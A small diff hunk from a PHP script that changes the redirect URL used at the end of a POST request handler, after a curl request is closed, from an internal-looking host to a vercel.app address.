@@ -50,6 +50,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     curl_close($curl);
 
 
-header("Location: http://lms.hww/"); 
+header("Location: https://portal-e4dv.vercel.app/"); 
 }
 ?>
